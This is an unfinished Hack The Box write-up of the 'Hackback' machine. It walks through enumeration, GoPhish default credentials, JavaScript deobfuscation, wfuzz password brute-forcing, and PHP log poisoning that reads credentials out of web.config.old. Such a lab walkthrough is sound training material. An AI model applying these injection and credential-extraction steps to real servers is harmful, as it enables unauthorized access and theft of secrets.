---
layout: post
title: "Hack The Box: 'Hackback' Writeup"
image: ""
date: 2020-04-10 00:04:07
tags:
  - hackthebox
  - windows
  - javascript-deobfuscation
  - command-injection
  - DCOM
  - manual-exploit
  - apsx-tunneling
  - log-poisoning
  - powershell
description: ""
categories:
  - Hack The Box
---

<style>

#myBtn {
  display: none;
  position: fixed;
  bottom: 40px;
  right: 50px;
  z-index: 99;
  font-size: 12px;
  border: 1px solid black;
  outline: black;
  background-color: #262626;
  color: white;
  cursor: pointer;
  padding: 10px 22px 10px 22px;
  border-radius: 10px;
  font-family: 'Open Sans';
}

#myBtn:hover {
  background-color: #5d4d7a;
}

applause-button {
		margin: auto;
	}

	.header-site .site-title {
      	padding-top: 5px;
      	color: white;
      	text-align: center;
      	font-weight: bold;
      	padding-left: 19px;
	}
	
	.hackback-img {
		max-width: 100%;
	}

	.post-content img { 
		margin: 1.875rem auto;
		display: block;
	}
</style>

<button onclick="topFunction()" id="myBtn" title="Go to top">↑</button>

<script>
// When the user scrolls down 20px from the top of the document, show the button
window.onscroll = function() {scrollFunction()};

function scrollFunction() {
  if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
    document.getElementById("myBtn").style.display = "block";
  } else {
    document.getElementById("myBtn").style.display = "none";
  }
}

// When the user clicks on the button, scroll to the top of the document
function topFunction() {
  document.body.scrollTop = 0;
  document.documentElement.scrollTop = 0;
}
</script>

<!-- add the button style & script -->
<link rel="stylesheet" href="/assets/css/applause-button.css" />
<script src="/assets/js/applause-button.js"></script>

<img src="/assets/img/writeups/HTB-HACKBACK/HTB-HACKBACK-BADGE.PNG" class="hackback-img" alt="Hack The Box - Hackback">

### Preface

If you find anything in this writeup you feel is inaccurately depicted and/or explained, please reach out to me and let me know! I am always willing to make corrections in order to provide the most accurate information possible, while also taking the opportunity to learn and grow. Thanks!

<p><br></p>

### Overview

The `Hackback` machine on Hack The Box (created by <a href="https://www.hackthebox.eu/home/users/profile/1391">decoder</a> and <a href="https://www.hackthebox.eu/home/users/profile/12438">yuntao</a>) is a retired 50 point Windows machine. This machine is incredibly difficult; so difficult that it maintained a 9.4/10 difficulty rating for almost a week upon being released. The initial steps involve locating a GoPhish website where default credentials are used to login. There are also some vhosts which lead to a hidden administration link within some obfuscated JavaScript code. Next, the parameters of a web admin page can be fuzzed to determine its log files are SHA-256 checksums of connecting IP addresses. Log poisoning is then performed to gain read/write access. A file called `web.config.old` is extracted from the web server and contains credentials for the user `simple`. A reGeorg aspx tunnel is then utilized to connect to the remote machine. This enables tunneling via a SOCKS proxy with WinRM and the credentials found for `simple` in `web.config.old`. A command injection vulnerability in a powershell script called `dellog.ps1` can be leveraged in association with a `clean.ini` file to escalate to the user `hacker`. Once escalated, the user `hacker` can start/stop a suspicious service called `UserLogger`, which accepts an argument. This can be abused to escalate folder path permissions. Finally, `root.txt` can be viewed by reading an alternate data stream (ADS).

<p><br></p>

_deep breath_

<p><br></p>
To start, I dove in with an initial `nmap` scan for general port discovery and service enumeration.
<p><br></p>

### Nmap Scan

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
➜  HACKBACK cat nmap/Full_10.10.10.128.nmap
# Nmap 7.70 scan initiated Wed Jun 26 18:41:47 2019 as: nmap -Pn -sCV -p80,6666,64831 -oN nmap/Full_10.10.10.128.nmap 10.10.10.128
Nmap scan report for hackback.htb (10.10.10.128)
Host is up (0.082s latency).

PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 10.0
| http-methods:
|_ Potentially risky methods: TRACE
|\_http-server-header: Microsoft-IIS/10.0
|\_http-title: IIS Windows Server
6666/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-server-header: Microsoft-HTTPAPI/2.0
|\_http-title: Site doesn't have a title.
64831/tcp open ssl/unknown
| fingerprint-strings:
| FourOhFourRequest:
| HTTP/1.0 404 Not Found
| Content-Type: text/plain; charset=utf-8
| Set-Cookie: \_gorilla_csrf=MTU2MTYxNDA0MHxJbmhYYWtwMFRDODFiVEprV2xKVlZuUldNME5sZUhGaU4ySTNNVzRyYVhOdU5uVlpaR3N2VVV0SFJWVTlJZ289fIsEWDUNIsfBkhOODEW4L0oYhWhQiD3ICcQhMBf0PS-q; HttpOnly; Secure
| Vary: Accept-Encoding
| Vary: Cookie
| X-Content-Type-Options: nosniff
| Date: Thu, 27 Jun 2019 05:40:40 GMT
| Content-Length: 19
| page not found
| GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq:
| HTTP/1.1 400 Bad Request
| Content-Type: text/plain; charset=utf-8
| Connection: close
| Request
| GetRequest:
| HTTP/1.0 302 Found
| Content-Type: text/html; charset=utf-8
| Location: /login?next=%2F
| Set-Cookie: \_gorilla_csrf=MTU2MTYxNDAxMnxJa3cyYmxCelpETjFOa1pNUldoQ2NYaEthV3BHYkdsaVJIQnhkbmR3TVM5NmVHUmhVQ3NyYUVGemJVMDlJZ289fKUowzV0RRkNbELD00_5x7uTSyDte6KzWnCGJXT9t5WI; HttpOnly; Secure
| Vary: Accept-Encoding
| Vary: Cookie
| Date: Thu, 27 Jun 2019 05:40:12 GMT
| Content-Length: 38
| href="/login?next=%2F">Found</a>.
| HTTPOptions:
| HTTP/1.0 302 Found
| Location: /login?next=%2F
| Set-Cookie: \_gorilla_csrf=MTU2MTYxNDAxMnxJakIwVjFaVlpFcFRjQ3RsYlhsRWN5OHdXak5aTXpaeWFXOVpaRUUwVDJRNFptdHZabkZCVUN0b2QwVTlJZ289fBPuJzUomVC9beg6yLA8C9i23sXvZr_EQsMiLoCnbQRM; HttpOnly; Secure
| Vary: Accept-Encoding
| Vary: Cookie
| Date: Thu, 27 Jun 2019 05:40:12 GMT
|_ Content-Length: 0
| ssl-cert: Subject: organizationName=Gophish
| Not valid before: 2018-11-22T03:49:52
|\_Not valid after: 2028-11-19T03:49:52
</code></pre></div></div>

### Enumerating Port 80

I additionally added `hackback.htb` to my `/etc/hosts` file. After, the first thing I noticed was the IIS 10.0 web server running on port 80. Upon browsing to the address in Firefox-ESR, I was greeted by a picture of a donkey...

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-WP-DONKEY.PNG" class="hackback-img" alt="Hackback - Front Page Donkey">

I decided to run a `gobuster` scan as well, but didn't manage to come up with anything useful.

```bash
➜  gobuster gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://hackback.htb -x php,aspx,txt,ini,png,jpg
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://hackback.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jpg,php,aspx,txt,ini,png
[+] Timeout:        10s
===============================================================
2020/04/15 14:31:15 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
/. (Status: 200)
```

### Enumerating Port 6666

Moving on, I checked out port 6666. It appears to be running Microsoft HTTPAPI 2.0, so I ran `gobuster` again to see if I could find anything useful.

```bash
➜  HACKBACK gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://hackback.htb:6666/ -x php,aspx,txt,ini,png,jpg
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://hackback.htb:6666/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     ini,png,jpg,php,aspx,txt
[+] Timeout:        10s
===============================================================
2020/04/15 14:37:01 Starting gobuster
===============================================================
/help (Status: 200)
```

Eventually a `/help` directory was discovered, which I attempted to interact with using `curl`.

```bash
➜  HACKBACK curl -X GET http://10.10.10.128:6666/help
"hello,proc,whoami,list,info,services,netsat,ipconfig"
```

Unfortunately, none of the commands appeared to be very useful, and I wasn't getting anywhere attempting to perform different injection attacks in the process of enumerating...

```bash
➜  HACKBACK curl -X GET http://10.10.10.128:6666/hello
"hello donkey!"
```

### Enumerating Port 64831

After spending a while messing with the commands on port 6666, I decided to browse port 64831. I had already been running passive recon on this port while attempting code injection on port 6666. This enabled me to quickly discover a GoPhish login page over HTTPS.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GOPHISH-LOGIN.PNG" class="hackback-img" alt="Hackback - GoPhish Login">

I decided to start off simple and look up the default credentials for a GoPhish `admin` account. A brief Google search did the trick:

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-ADMIN-CREDS.PNG" class="hackback-img" alt="Hackback - GoPhish Login Credential Search">

Awesome, the credentials are `admin:gophish`. I went ahead and gave them a try...

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-LOGIN-ADMIN.PNG" class="hackback-img" alt="Hackback - GoPhish Admin Login">

The credentials worked!

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-DASH.PNG" class="hackback-img" alt="Hackback - GoPhish Admin Dashboard">

After doing some browsing, I discovered the `Email Templates` panel contained quite a few different templates that had been created already.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-GP-EMAIL-TEMPLATES.PNG" class="hackback-img" alt="Hackback - GoPhish Email Templates">

The `Admin` template appeared to contain a information for the `admin` sub domain at `admin.hackback.htb`.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-ADMIN-TEMPLATE.PNG" class="hackback-img" alt="Hackback - GoPhish Admin Template">

### Enumerating the Admin Sub Domain

Upon browsing to `admin.hackback.htb`, I was directed to some sort of login page.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-ADMIN-SD.PNG" class="hackback-img" alt="Hackback - Admin Sub Domain Login">

Viewing the page's source, I discovered an interesting comment left in the HTML...

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-JS-NOTE.PNG" class="hackback-img" alt="Hackback - JavaScript Comment ">

However, upon browsing to `admin.hackback.htb/js/.js`, I was met with a 404 error.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-JS-ERROR.PNG" class="hackback-img" alt="Hackback - GoPhish JavaScript File Error">

So, I decided to fire up another `gobuster` scan and specify `.js` as the only extension.

```bash
➜  HACKBACK gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt -u http://admin.hackback.htb/js/ -x js
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://admin.hackback.htb/js/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     js
[+] Timeout:        10s
===============================================================
2020/04/15 15:06:04 Starting gobuster
===============================================================
/private.js (Status: 200)
```

I immediately got a hit on `private.js`!
<p><br></p>

### Analyzing the private.js File


Checking out the source, it appeared to be a bunch of obfuscated JavaScript...

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-PRIVATEJS.PNG" class="hackback-img" alt="Hackback - private.js file">

Further examination of the `private.js` file revealed it is actually encoded with ROT13. I initially determined this by noticing the first line:

```javascript
ine n =
``` 
I attributed it to being
```javascript
var a =
```
I also had to decipher the remainder with a `Caesar cipher`. This was the output once I had everything decoded and beautified:
```javascript
var a = [
  'WxIjwr7DusO8GsKvRwB+wq3DuMKrwrLDgcOiwrY1KEEgG8KCwq7Dl8K3',
  'AcOMwqvDqQgCw4/Ct2nDtMKhZcKDwqTCpTsyw7nChsOQXMO5W8KpDsOtNCDDvAjCgyk=',
  'w5HDr8O7dDRmMMKJw4jDlVRnwrt7w7s0wo1aw7sAQsKsfsOEw4XDsRjClMOwFzrCmzpvCAjCuBzDssK9F8O4wqZnWsKh'
];
(function (c, d) {
  var e = function (f) {
    while (--f) {
      c['push'](c['shift']());
    }
  };
  e(++d);
}(a, 102));
var b = function (c, d) {
  c = c - 0;
  var e = a[c];
  if (b['MsULmv'] === undefined) {
    (function () {
      var f;
      try {
        var g = Function('return (function() ' + '{}.constructor("return this")( )' + ');');
        f = g();
      } catch (h) {
        f = window;
      }
      var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
      f['atob'] || (f['atob'] = function (j) {
        var k = String(j) ['replace'](/=+$/, '');
        for (var l = 0, m, n, o = 0, p = ''; n = k['charAt'](o++); ~n && (m = l % 4 ? m * 64 + n : n, l++ % 4) ? p += String['fromCharCode'](255 & m >> ( - 2 * l & 6))  : 0) {
          n = i['indexOf'](n);
        }
        return p;
      });
    }());
    var q = function (r, d) {
      var t = [
      ],
      u = 0,
      v,
      w = '',
      x = '';
      r = atob(r);
      for (var y = 0, z = r['length']; y < z; y++) {
        x += '%' + ('00' + r['charCodeAt'](y) ['toString'](16)) ['slice']( - 2);
      }
      r = decodeURIComponent(x);
      for (var A = 0; A < 256; A++) {
        t[A] = A;
      }
      for (A = 0; A < 256; A++) {
        u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 256;
        v = t[A];
        t[A] = t[u];
        t[u] = v;
      }
      A = 0;
      u = 0;
      for (var B = 0; B < r['length']; B++) {
        A = (A + 1) % 256;
        u = (u + t[A]) % 256;
        v = t[A];
        t[A] = t[u];
        t[u] = v;
        w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 256]);
      }
      return w;
    };
    b['OoACcd'] = q;
    b['qSLwGk'] = {
    };
    b['MsULmv'] = !![];
  }
  var C = b['qSLwGk'][c];
  if (C === undefined) {
    if (b['pIjlQB'] === undefined) {
      b['pIjlQB'] = !![];
    }
    e = b['OoACcd'](e, d);
    b['qSLwGk'][c] = e;
  } else {
    e = C;
  }
  return e;
};
var x = 'Secure Login Bypass';
var z = b('0x0', 'P]S6');
var h = b('0x1', 'r7TY');
var y = b('0x2', 'DAqg');
var t = '?action=(show,list,exec,init)';
var s = '&site=(twitter,paypal,facebook,hackthebox)';
var i = '&password=********';
var k = '&session=';
var w = 'Nothing more to say';
```
Once I had the full output, I was able to run the `private.js` file and extract the variable contents with `node`. The output of the variables upon doing so was the following:

```javascript
> x
'Secure Login Bypass'
> z
'Remember the secret path is'
> h
'2bb6916122f1da34dcd916421e531578'
> y
'Just in case I loose access to the admin panel'
> t
'?action=(show,list,exec,init)'
> s
'&site=(twitter,paypal,facebook,hackthebox)'
> i
'&password=********'
> k
'&session='
> w
'Nothing more to say'
```
It appears there is a secret path at `/2bb6916122f1da34dcd916421e531578`. However, I wasn't able to locate anything when checking the URL directly.

```bash
➜  HACKBACK curl -X GET http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578
<head><title>Document Moved</title></head>
<body><h1>Object Moved</h1>This document may be found <a HREF="http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/">here</a></body>
```
As a result of this, I decided to FUZZ the endpoint for additional files.

```bash
➜  HACKBACK wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt --hc 404 -t 15 http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/FUZZ
Total requests: 16243

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                     
===================================================================

000000061:   200        8 L      13 W     132 Ch      "index.html"                                                                                                                                
000000366:   200        8 L      13 W     132 Ch      "."
```
I wasn't getting anywhere quick doing that though... However, I took a step back and tried to think smarter instead of harder. I recalled the `private.js` file contained lists of `actions` and `sites` for variables `t` and `s`:

```javascript
var t = '?action=(show,list,exec,init)';
var s = '&site=(twitter,paypal,facebook,hackthebox)';
```

### Sub Domain Parameter Fuzzing

I ended up building two wordlists with the contents of these variables.
 
```bash
➜  HACKBACK cat actions.txt; echo -n '--\n';  cat sites.txt
show
list
exec
init
--
twitter
paypal
facebook
hackthebox
```

Then, I tested out `wfuzz` again with the aforementioned wordlists and parameters.

```bash
➜  HACKBACK wfuzz -w actions.txt -w sites.txt --hc 404 "http://admin.hackback.htb/?action=FUZZ&site=FUZZ"

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://admin.hackback.htb/?action=FUZZ&site=FUZ2Z&password=&session=
Total requests: 16

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                     
===================================================================

000000004:   200        27 L     66 W     825 Ch      "show - hackthebox"                                                                                                                         
000000002:   200        27 L     66 W     825 Ch      "show - paypal"                                                                                                                             
000000001:   200        27 L     66 W     825 Ch      "show - twitter"                                                                                                                            
000000005:   200        27 L     66 W     825 Ch      "list - twitter"                                                                                                                            
000000011:   200        27 L     66 W     825 Ch      "exec - facebook"                                                                                                                           
000000012:   200        27 L     66 W     825 Ch      "exec - hackthebox"                                                                                                                         
000000014:   200        27 L     66 W     825 Ch      "init - paypal"                                                                                                                             
000000003:   200        27 L     66 W     825 Ch      "show - facebook"                                                                                                                           
000000013:   200        27 L     66 W     825 Ch      "init - twitter"                                                                                                                            
000000008:   200        27 L     66 W     825 Ch      "list - hackthebox"                                                                                                                         
000000009:   200        27 L     66 W     825 Ch      "exec - twitter"                                                                                                                            
000000007:   200        27 L     66 W     825 Ch      "list - facebook"                                                                                                                           
000000010:   200        27 L     66 W     825 Ch      "exec - paypal"                                                                                                                             
000000006:   200        27 L     66 W     825 Ch      "list - paypal"                                                                                                                             
000000015:   200        27 L     66 W     825 Ch      "init - facebook"                                                                                                                           
000000016:   200        27 L     66 W     825 Ch      "init - hackthebox"                                                                                                                         

Total time: 0.321124
Processed Requests: 16
Filtered Requests: 0
Requests/sec.: 49.82486
```
This returned all viable `sites` and `actions`. I ended up obtaining the password for the `hackthebox` site shortly after using `wfuzz`:

```bash
➜  HACKBACK wfuzz -w /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-10.txt "http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=FUZZ"

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=FUZZ
Total requests: 92

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                     
===================================================================

000000008:   302        6 L      12 W     117 Ch      "12345678" 
```

The password is `12345678`. When I ran `curl` against the endpoint using that password, I got an interesting response.

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=12345678'
Array
(
    [0] => .
    [1] => ..
    [2] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```
There appeared to be a `.log` file with a hashed name. I used `hash-identifier` to determine what type of hash it was.

```bash
➜  HACKBACK hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7

Possible Hashs:
[+] SHA-256
```
SHA-256 was apparently the most likely. I struggled quite a bit to determine what could be going on at this point... After a few pointers from some teammates, I discovered that attempting to login to `www.hackthebox.htb`, the URL from the `HackTheBox` email template, generates a second `.log` file with a SHA-256 hash of my IP address as its name.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-HTB-LOGIN.PNG" class="hackback-img" alt="Hackback - Hack The Box Login">

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=list&site=hackthebox&password=12345678'
Array
(
    [0] => .
    [1] => ..
    [2] => 972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b.log
    [3] => e691d0d9c19785cf4c5ab50375c10d83130f175f7f89ebd1899eee6a7aab0dd7.log
)
```
I was able to verify the hash of the new log file by checking the SHA-256 sum of my IP address, which was verified as being: `972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b`
<p><br></p>

### Log Poisoning Discovery & Enumeration

Equipped with my new session ID, I was now able to utilize the `action=show` parameter to view the contents of the log file.

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:07:44 PM] 10.10.14.37 - Username: farbs@hackback.htb, Password: ilovehacking!
```
I discovered the log file contains `POST` parameters that are sent to `www.hackthebox.htb`. This is interesting, as it led me to assume I could perform a log poisoning attack if I injected PHP code into the `.log` file for my IP address. I decided to enter a PHP payload into both the `username` and `password` fields of the fake Hack The Box login page and check the `.log` file after for evidence of code injection.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-HTB-LOGIN-INJECTION.PNG" class="hackback-img" alt="Hackback - HTB Login PHP Injection">

Once I checked the `.log` file afterwards:

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:07:44 PM] 10.10.14.37 - Username: farbs@hackback.htb, Password: ilovehacking!
[15 April 2020, 08:15:27 PM] 10.10.14.37 - Username: Farbs was here!, Password: Farbs was here!
```
The PHP appeared to have ran successfully! However, this is where everything started to get a bit hairy... I struggled to get any kind of shell back using `shell_exec, exec`, etc. and couldn't even run `phpinfo`. I was still able to list directories, as well as utilize php wrapper syntax such as `base64_encode(file_get_contents())`.
<p><br></p>
Running `scandir` proved to be quite useful, however, as I was able to view directory contents still.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-SCANDIR-C1.PNG" class="hackback-img" alt="Hackback - HTB Login scandir() Initial Directory">

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:07:44 PM] 10.10.14.37 - Username: farbs@hackback.htb, Password: ilovehacking!
[15 April 2020, 08:15:27 PM] 10.10.14.37 - Username: Farbs was here!, Password: Farbs was here![15 April 2020, 08:27:02 PM] 10.10.14.37 - Username: Array
(
    [0] => .
    [1] => ..
    [2] => index.html
    [3] => webadmin.php
)
, Password: // this is just a comment
```
After doing a bit of traversing, I located a `web.config.old` file located in `/inetpub/wwwroot/new_phish/admin`.

```
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:40:57 PM] 10.10.14.37 - Username: Array
(
    [0] => .
    [1] => ..
    [2] => 2bb6916122f1da34dcd916421e531578
    [3] => App_Data
    [4] => aspnet_client
    [5] => css
    [6] => img
    [7] => index.php
    [8] => js
    [9] => logs
    [10] => web.config
    [11] => web.config.old
)
, Password: // farbs was here again!
```
The file appeared to contain some credentials.

```bash
➜  HACKBACK curl -X GET 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/WebAdmin.php?action=show&site=hackthebox&password=12345678&session=972d14b51c047ebff05b7eb1d1acff3d5989bac8407b45e28013a3584834270b'
[15 April 2020, 08:43:31 PM] 10.10.14.37 - Username: <?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <authentication mode="Windows">
        <identity impersonate="true"                 
            userName="simple" 
            password="ZonoProprioZomaro:-("/>
     </authentication>
        <directoryBrowse enabled="false" showFlags="None" />
    </system.webServer>
</configuration>
, Password: // one more comment for fun!
```

I was able to obtain the file by submitting the following PHP:

```php
<?php echo(file_get_contents('/inetpub/wwwroot/new_phish/admin/web.config.old')); ?>
```
I wasn't able to use the credentials yet, but I had a feeling they might come in handy eventually.

### Tunneling with reGeorg

Armed with the ability to write files to the system via PHP log poisoning, and considering I still didn't have access to any `shell_exec` or `exec` functions in general, I decided to utilize <a href="https://github.com/sensepost/reGeorg">reGeorg</a> for pivoting. This tool enabled me to create a local SOCKS proxy bound to a remote `.aspx` file running on the target machine.

### Writeup still in progress... Check back later for more!

<div align="center">
	<h3> Thanks for reading! </h3>
</div>
<div align="center">
<!-- add the button! -->
<applause-button style="width: 58px; height: 58px;" color="#5d4d7a" url="https://defarbs.com/"/>
</div>
<div align="center">
	<a href="https://www.hackthebox.eu/profile/39047">
		<img htb-logo="image" src="https://www.hackthebox.eu/badge/image/39047" alt="Hack The Box">
	</a>
</div>